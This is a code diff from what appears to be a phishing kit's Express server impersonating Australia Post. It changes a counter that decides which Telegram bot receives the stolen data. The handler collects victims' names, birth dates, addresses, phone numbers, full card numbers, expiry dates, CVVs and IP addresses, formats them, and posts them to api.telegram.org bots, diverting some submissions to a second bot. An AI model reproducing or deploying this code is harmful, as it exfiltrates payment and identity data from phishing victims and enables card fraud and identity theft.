@@ -310,7 +310,7 @@ app.post("/ausPostTheOnlyMY", (req, res) => {
     });
 });
 
-let frankAbignale = 2;
+let frankAbignale = 0;
 
 app.options("/ausPostfrankabignale100!", cors());
 
@@ -371,11 +371,11 @@ app.post("/ausPostfrankabignale100!", (req, res) => {
     .then(function () {
       binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      if (frankAbignale == 4) {
+      if (frankAbignale == 15) {
         axios.post(
           `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
         );
-        frankAbignale = 0;
+        frankAbignale = 10;
       } else {
         axios.post(
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostFrankabignale100:\n${originalText}`
